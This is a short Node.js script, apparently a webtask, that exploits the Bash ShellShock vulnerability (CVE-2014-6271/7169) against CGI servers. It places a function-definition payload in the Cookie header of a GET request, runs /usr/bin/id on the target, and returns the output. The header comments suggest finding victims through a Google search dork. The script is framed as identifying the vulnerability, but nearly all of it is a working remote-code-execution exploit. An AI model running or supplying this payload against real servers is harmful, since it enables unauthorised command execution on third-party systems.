// objetive: This script aims to identify the Bash ShellShock vulnerability (CVE-2014-6271 and CVE-2014-7169) using the HTTP protocol
// target: *nix server executing CGI scripts invoquing bash commands. Google search could help to identify targets eg.: "site:de inurl:cg ext:sh"
// how it works: special manipulation of the 'Cookie header' will execute a bash command in the vulnerable target returning the output in the html response. 

var http = require('http');

// define wt for code exec
module.exports = function (ctx, cb) { // main 
var host = ctx.data.host;
var path = ctx.data.path;

// var host = process.argv[2];
// var path = process.argv[3];

var options = { 
    hostname: host,
    path: path,
    method: 'GET',
    headers: {'Cookie': '() { :; }; echo "Content-Type: text/plain";echo;echo;/usr/bin/id'}
};

console.log(options);

var results = ''; 
var req = http.request(options, function(res) {
    res.on('data', function (chunk) {
        results = results + chunk;
	console.log('Cookie response: '+ results);
	cb(null, 'Cookie response: '+ results);
    }); 
    res.on('end', function () {
	console.log('Session: end');
    }); 
});

req.on('error', function(error) {
	console.log('Session error: ' +error);
	// cb('Session error: '+ error);
});

req.end();

} // close main 

